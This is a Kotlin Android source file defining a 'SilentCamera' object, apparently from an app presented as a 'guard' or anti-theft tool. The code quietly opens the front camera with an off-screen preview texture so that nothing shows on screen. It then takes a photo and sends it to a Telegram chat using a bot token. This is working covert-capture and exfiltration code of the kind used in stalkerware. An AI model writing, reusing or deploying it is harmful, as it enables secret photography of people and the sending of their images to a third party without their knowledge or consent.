package com.example.guard

import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.os.Handler
import android.os.HandlerThread

object SilentCamera {

    fun capture(token: String, chat: String, name: String, label: String) {
        val thread = HandlerThread("GuardCamera")
        thread.start()
        val handler = Handler(thread.looper)
        handler.post {
            var camera: Camera? = null
            try {
                var camId = -1
                val info = Camera.CameraInfo()
                for (i in 0 until Camera.getNumberOfCameras()) {
                    Camera.getCameraInfo(i, info)
                    if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        camId = i
                        break
                    }
                }
                if (camId == -1) camId = 0

                camera = Camera.open(camId)
                camera.setPreviewTexture(SurfaceTexture(10))
                camera.startPreview()

                handler.postDelayed({
                    try {
                        camera?.takePicture(null, null) { data, cam ->
                            Telegram.sendPhoto(token, chat, "$name: $label", data)
                            try { cam.stopPreview() } catch (e: Exception) {}
                            try { cam.release() } catch (e: Exception) {}
                            thread.quitSafely()
                        }
                    } catch (e: Exception) {
                        try { camera?.release() } catch (e2: Exception) {}
                        thread.quitSafely()
                    }
                }, 800)
            } catch (e: Exception) {
                try { camera?.release() } catch (e2: Exception) {}
                thread.quitSafely()
            }
        }
    }
}
